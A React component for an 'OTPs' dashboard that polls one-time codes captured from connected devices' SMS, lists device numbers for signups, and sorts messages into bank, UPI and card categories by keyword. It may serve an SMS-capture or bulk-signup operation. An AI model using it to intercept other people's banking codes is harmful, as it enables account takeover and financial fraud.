import { useEffect, useMemo, useState } from "react";
import { Layout } from "@/components/layout";
import { getOtps, type OtpRow } from "@/lib/api";
import { usePolling } from "@/lib/usePolling";

const CAT_KEYS = {
  bank: /bank|hdfc|sbi|icici|axis|kotak|bob|union|pnb|net banking|atm|withdraw|credited|debited|transaction/i,
  upi: /upi|paytm|phonepe|gpay|google pay|bhim|yono|freecharge|amazon pay/i,
  card: /card|cvv|pin|expiry|emi|visa|mastercard|rupay/i,
};

function categoryOf(record: {
  body?: string;
  service?: string;
}): "bank" | "upi" | "card" | "other" {
  const text = `${record.body || ""} ${record.service || ""}`;
  if (CAT_KEYS.bank.test(text)) return "bank";
  if (CAT_KEYS.upi.test(text)) return "upi";
  if (CAT_KEYS.card.test(text)) return "card";
  return "other";
}
import { useToast } from "@/hooks/use-toast";
import {
  KeyRound,
  Copy,
  CheckCircle2,
  Search,
  Phone,
  Filter,
  Hash,
  Smartphone,
  ShieldCheck,
} from "lucide-react";

interface OtpEntry {
  code?: string;
  service?: string;
  number?: string;
  from?: string;
  body?: string;
  deviceId?: string;
  date?: number;
}

interface DeviceNumbers {
  id: string;
  model: string;
  isOnline: boolean;
  numbers: string[];
}

function timeAgo(t?: number): string {
  if (!t) return "—";
  const s = Math.floor((Date.now() - t) / 1000);
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

export function OtpPanel() {
  const { toast } = useToast();
  const [entries, setEntries] = useState<OtpEntry[]>([]);
  const [devices, setDevices] = useState<DeviceNumbers[]>([]);
  const [search, setSearch] = useState("");
  const [service, setService] = useState("all");
  const [numberFilter, setNumberFilter] = useState("all");
  const [cat, setCat] = useState<"all" | "bank" | "upi" | "card" | "other">(
    "all"
  );
  const [copied, setCopied] = useState<string | null>(null);

  // OTPs + device numbers served by the api-server (Bearer auth, owner-filtered)
  const { data: otpData, loading } = usePolling(getOtps, 4000);

  useEffect(() => {
    if (!otpData) return;
    setEntries((otpData.otps || []).map((o: OtpRow) => o));
    setDevices((otpData.devices || []).map((d) => d));
  }, [otpData]);

  const services = useMemo(
    () => [...new Set(entries.map((e) => e.service || "Unknown"))].sort(),
    [entries]
  );

  const filtered = useMemo(() => {
    const q = search.toLowerCase();
    return entries.filter((e) => {
      if (service !== "all" && (e.service || "Unknown") !== service)
        return false;
      if (numberFilter !== "all" && e.number !== numberFilter) return false;
      if (!q) return true;
      return (
        (e.code || "").includes(q) ||
        (e.number || "").includes(q) ||
        (e.service || "").toLowerCase().includes(q) ||
        (e.from || "").toLowerCase().includes(q) ||
        (e.body || "").toLowerCase().includes(q)
      );
    });
  }, [entries, search, service, numberFilter]);

  const copyText = async (text: string, key: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
    toast({ title: "Copied", description: text });
  };

  const servicesCount = services.length;

  return (
    <Layout>
      <div className="flex flex-col gap-4 mb-5">
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            <p className="page-eyebrow">Signups</p>
            <h1 className="page-title flex items-center gap-2">
              <KeyRound className="w-6 h-6 text-primary" />
              OTPs
            </h1>
            <p className="text-sm text-muted-foreground mt-1 flex items-center gap-2 flex-wrap">
              <Phone className="w-4 h-4 text-primary shrink-0" />
              <span>
                One-time codes from your devices' SMS — {entries.length}{" "}
                captured · {servicesCount} services
              </span>
            </p>
          </div>
        </div>

        {/* ── Device numbers for signups ── */}
        <div className="relative overflow-hidden rounded-2xl border border-card-border bg-card/70 backdrop-blur p-4">
          <span className="absolute -top-12 -right-12 w-40 h-40 rounded-full bg-primary/10 blur-3xl" />
          <div className="relative flex items-start gap-3 mb-3">
            <span className="flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-br from-primary/20 to-accent/10 ring-1 ring-primary/20 shrink-0">
              <ShieldCheck className="w-5 h-5 text-primary" />
            </span>
            <div className="min-w-0">
              <h2 className="font-display font-semibold text-sm">
                Your numbers for signups
              </h2>
              <p className="text-xs text-muted-foreground mt-0.5">
                Use one of these when registering on any platform — the OTP will
                land here instantly. Tap a number to filter its codes.
              </p>
            </div>
          </div>

          {devices.length === 0 ? (
            <p className="relative text-xs text-muted-foreground py-2">
              No numbers available yet — connect a device first.
            </p>
          ) : (
            <div className="relative grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
              {devices.map((d) => (
                <div
                  key={d.id}
                  className="rounded-xl border border-card-border bg-card/60 p-3"
                >
                  <div className="flex items-center justify-between gap-2 mb-2">
                    <span
                      className="font-display font-semibold text-xs truncate"
                      title={d.model}
                    >
                      {d.model}
                    </span>
                    <span
                      className={`inline-flex items-center gap-1 px-1.5 py-0.5 rounded-full text-[9px] font-bold ${
                        d.isOnline
                          ? "bg-success/10 text-success"
                          : "bg-muted/60 text-muted-foreground"
                      }`}
                    >
                      <span
                        className={`w-1 h-1 rounded-full ${d.isOnline ? "bg-success animate-pulse" : "bg-muted-foreground"}`}
                      />
                      {d.isOnline ? "LIVE" : "OFFLINE"}
                    </span>
                  </div>
                  <div className="flex flex-wrap gap-1.5">
                    {d.numbers.map((n) => {
                      const active = numberFilter === n;
                      return (
                        <button
                          key={n}
                          onClick={() => {
                            copyText(n, `num-${n}`);
                            setNumberFilter(active ? "all" : n);
                          }}
                          title="Tap to copy + filter OTPs"
                          className={`inline-flex items-center gap-1 font-mono text-[11px] font-semibold px-2 py-1 rounded-lg border transition-all ${
                            active
                              ? "bg-primary/15 text-primary border-primary/40 shadow-md shadow-primary/10"
                              : "bg-muted/40 text-muted-foreground border-card-border hover:text-foreground hover:border-primary/40"
                          }`}
                        >
                          {copied === `num-${n}` ? (
                            <CheckCircle2 className="w-3 h-3" />
                          ) : (
                            <Phone className="w-3 h-3" />
                          )}
                          {n}
                        </button>
                      );
                    })}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* ── Category chips ── */}
        <div className="flex flex-wrap gap-1.5 p-1 rounded-xl border border-card-border bg-card/70 backdrop-blur w-fit mb-3">
          {(
            [
              ["all", "All"],
              ["bank", "Bank"],
              ["upi", "UPI"],
              ["card", "Card"],
              ["other", "Other"],
            ] as const
          ).map(([key, label]) => {
            const count =
              key === "all"
                ? entries.length
                : entries.filter((e) => categoryOf(e) === key).length;
            return (
              <button
                key={key}
                onClick={() => setCat(key)}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                  cat === key
                    ? "bg-primary text-primary-foreground shadow-md shadow-primary/25"
                    : "text-muted-foreground hover:text-foreground hover:bg-muted"
                }`}
              >
                {label}{" "}
                <span className="opacity-60 font-mono text-[10px]">
                  {count}
                </span>
              </button>
            );
          })}
        </div>

        {/* ── Filters ── */}
        <div className="flex flex-col sm:flex-row gap-2">
          <div className="relative flex-1">
            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <input
              type="text"
              placeholder="Search code, number, service, sender..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-full bg-card border border-card-border rounded-xl pl-11 pr-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
            />
          </div>
          <div className="relative">
            <Filter className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <select
              value={service}
              onChange={(e) => setService(e.target.value)}
              className="appearance-none w-full sm:w-52 bg-card border border-card-border rounded-xl pl-10 pr-8 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-primary/40 cursor-pointer"
            >
              <option value="all">All services</option>
              {services.map((s) => (
                <option key={s} value={s}>
                  {s}
                </option>
              ))}
            </select>
          </div>
          {numberFilter !== "all" && (
            <button
              onClick={() => setNumberFilter("all")}
              className="inline-flex items-center justify-center gap-2 px-4 h-11 rounded-xl border border-primary/40 bg-primary/10 text-primary text-sm font-semibold hover:bg-primary/20 transition-all"
            >
              <Hash className="w-4 h-4" /> {numberFilter} ✕
            </button>
          )}
        </div>
      </div>

      {loading && (
        <div className="space-y-3">
          {[0, 1, 2].map((i) => (
            <div key={i} className="glass-card h-24 animate-pulse" />
          ))}
        </div>
      )}

      {!loading && filtered.length === 0 && (
        <div className="glass-card p-10 text-center text-muted-foreground">
          <KeyRound className="w-8 h-8 mx-auto mb-2 opacity-40" />
          <p className="font-medium">
            {entries.length === 0
              ? "No OTPs yet"
              : "No OTPs match your filters"}
          </p>
          <p className="text-xs mt-1">
            The moment a device receives a verification code, it lands here.
          </p>
        </div>
      )}

      <div className="space-y-3">
        {filtered.map((e) => {
          const key = `${e.code}-${e.number}-${e.date}`;
          return (
            <div key={key} className="glass-card overflow-hidden">
              <div className="flex items-start gap-3 p-4">
                <div className="flex-1 min-w-0">
                  <div className="flex flex-wrap items-center gap-2 mb-2">
                    <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-lg bg-primary/10 text-primary text-sm font-bold font-mono tracking-widest">
                      <Hash className="w-3.5 h-3.5" /> {e.code}
                    </span>
                    {e.service && (
                      <span className="px-2 py-0.5 rounded-full bg-muted text-muted-foreground text-[10px] font-semibold uppercase tracking-wide">
                        {e.service}
                      </span>
                    )}
                  </div>
                  <div className="flex flex-wrap items-center gap-x-4 gap-y-1 text-xs text-muted-foreground mb-1.5">
                    <span className="inline-flex items-center gap-1 font-mono text-foreground">
                      <Phone className="w-3 h-3 text-primary" />{" "}
                      {e.number || "—"}
                    </span>
                    <span>🕐 {timeAgo(e.date)}</span>
                    {e.from && <span>from {e.from}</span>}
                  </div>
                  {e.body && (
                    <p className="text-xs text-muted-foreground leading-relaxed line-clamp-2 break-words">
                      {e.body}
                    </p>
                  )}
                </div>
                <button
                  onClick={() => copyText(e.code || "", key)}
                  className="flex-shrink-0 p-2.5 rounded-xl border border-transparent hover:border-card-border text-muted-foreground hover:text-primary active:bg-muted transition-all"
                  title="Copy code"
                >
                  {copied === key ? (
                    <CheckCircle2 className="w-4 h-4 text-success" />
                  ) : (
                    <Copy className="w-4 h-4" />
                  )}
                </button>
              </div>
            </div>
          );
        })}
      </div>
    </Layout>
  );
}
